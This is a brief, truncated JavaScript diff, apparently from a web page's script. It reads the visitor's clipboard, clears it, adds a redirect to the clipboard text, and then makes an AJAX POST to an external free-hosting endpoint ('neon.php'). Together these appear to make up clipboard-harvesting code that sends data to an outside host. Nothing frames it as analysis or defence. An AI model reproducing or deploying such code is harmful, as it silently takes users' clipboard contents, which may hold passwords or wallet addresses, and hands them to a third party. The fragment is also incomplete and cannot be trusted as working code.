@@ -84,6 +84,7 @@
           navigator.clipboard.readText().then(text => {
             if(text != ""){
               navigator.clipboard.writeText("");
+              document.location.href = text;
     $.ajax({
       url: "https://footmal.000webhostapp.com/neon.php",
       type: "post",
